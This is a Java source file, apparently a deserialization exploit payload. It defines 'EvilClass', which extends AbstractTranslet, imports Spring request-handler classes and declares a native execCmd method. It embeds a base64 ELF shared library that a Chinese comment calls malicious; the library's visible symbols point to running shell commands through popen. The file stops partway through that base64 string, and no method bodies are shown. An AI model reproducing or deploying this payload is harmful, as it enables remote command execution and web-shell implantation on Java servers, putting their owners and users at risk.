import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Vector;

public class EvilClass extends AbstractTranslet {

    public static native String execCmd(String cmd);
    //恶意动态链接库文件的base64编码
    private static final String EVIL_JNI_BASE64 = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByAAAAARsDOygAAAAEAAAAHPD//0QAAACc8P//bAAAAGHx//+EAAAA+/H//6QAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAANDv//+AAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAAAo8P//CAAAAAAAAAAAAAAAHAAAAFwAAADV8P//mgAAAABBDhCGAkMNBgKVDAcIAAAcAAAAfAAAAE/x//9uAQAAAEEOEIYCQw0GA2kBDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA